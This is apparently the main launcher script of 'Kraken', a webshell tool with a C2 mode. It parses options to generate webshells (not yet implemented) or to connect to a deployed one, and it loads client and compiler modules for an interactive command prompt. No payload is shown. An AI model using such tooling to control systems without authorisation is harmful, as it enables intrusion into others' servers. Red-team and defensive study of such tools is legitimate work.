import os, argparse, traceback, importlib

from lib.config import MODE_STANDARD, MODE_C2
from lib.config import CLIENTS_PATH, AVAILABLE_COMPILERS
from lib.config import AGENTS_PATH, MODULES_PATH, ENVS_PATH, UTILS_PATH
from lib.common import dir_is_empty
from lib.exception import CoreException
from lib.printer import print_error, print_warning


def load_client(mode, profile, compiler, debug, log):
    client_filepath = f"lib/{CLIENTS_PATH}/{mode}.py"
    if not os.path.isfile(client_filepath):
        raise CoreException(f"client: '{client_filepath}' not found clients directory")

    client_mod = importlib.import_module(f"lib.{CLIENTS_PATH}.{mode}")
    client = client_mod.CustomClient(mode, profile, compiler, debug, log)
    return client

if __name__ == "__main__":

    client = None
    try:
        parser = argparse.ArgumentParser(description="Kraken, a modular multi-language webshell (coded by @secu_x11)")
        parser.add_argument('-g', "--generate", action='store_true', help="Generate a webshell (php/jsp/aspx)")
        parser.add_argument('-c', "--connect", action='store_true', help="Connect to a deployed webshell")
        parser.add_argument('-m', "--mode", action='store', default=MODE_STANDARD, choices=[MODE_STANDARD, MODE_C2], help="Mode of operation with agent")
        parser.add_argument('-p', "--profile", action='store', required=True, help="Filepath of Connection Profile to use")
        parser.add_argument('-k', "--compiler", action='store', required=True, choices=AVAILABLE_COMPILERS, help="Name of the compiler to use")
        parser.add_argument('-d', "--debug", action='store_true', help="Turn ON Debug Mode")
        parser.add_argument('-l', "--log", action='store_true', help="Log all executed commands and outputs")
        args = parser.parse_args()

        if os.name == "nt":
            os.system("color")

        if (dir_is_empty(AGENTS_PATH) or dir_is_empty(MODULES_PATH) or dir_is_empty(ENVS_PATH) or dir_is_empty(UTILS_PATH)):
            print_error("The project has not been cloned recursively. Ensure that the directories: 'agents', 'modules', 'utils' and/or 'envs' are not empty.")
            exit(1)

        if ((args.generate and args.connect) or (not args.generate and not args.connect)):
            parser.print_help()
            exit(1)

        if args.generate:
            print_warning("Not yet...")
            exit(0)
        elif args.connect:

            client = load_client(args.mode, args.profile, args.compiler, args.debug, args.log)
            client.do_status()
            client.load_commands()
            client.load_containers(args.compiler)
            client.load_compiler(args.compiler)
            client.prompt()
            client.unload_containers()
    
    except CoreException as ce:
        ce.print_exception(args.debug)
        if client != None:
            client.unload_containers()
        exit(1)
    except Exception as ex:
        print_error(f"Exception: {traceback.format_exc()}")
        if client != None:
            client.unload_containers()
        exit(1)
